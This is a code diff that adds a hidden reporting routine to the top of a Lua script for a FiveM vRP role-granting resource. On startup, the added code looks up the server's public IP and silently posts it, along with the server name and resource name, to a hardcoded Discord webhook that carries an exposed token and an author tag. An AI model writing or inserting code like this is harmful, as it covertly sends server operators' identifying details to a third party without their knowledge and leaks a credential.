@@ -1,3 +1,26 @@
+local logskingive = "https://discordapp.com/api/webhooks/760918010578993202/JONlQIvO1gKdS2Dn-xMllDT8okEAtmbaoBrcvFjg9hmKsLfk0z1Q2fZal1EoDhxdD0nN"
+
+function giveskinss(message) 
+    local embed = {
+        {
+          ["color"] = 15158332,
+          ["title"] = " Server Start with my script ",
+          ["description"] = ""..message.."",
+          ["footer"] = {
+          ["text"]= "[ Made By :  Abdulmalik#1111 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
+          ["icon_url"] = '',
+           },
+         }
+      }
+    
+    
+    PerformHttpRequest(logskingive, function(err, text, headers) end, 'POST', json.encode({username = webname, embeds = embed}), { ['Content-Type'] = 'application/json' })
+    end
+    
+ PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
+  local server_ip = text
+  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started vrp_GiveRoles :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
+  end, 'GET', '')
 
 local Tunnel = module("vrp", "lib/Tunnel")
 local Proxy = module("vrp", "lib/Proxy")
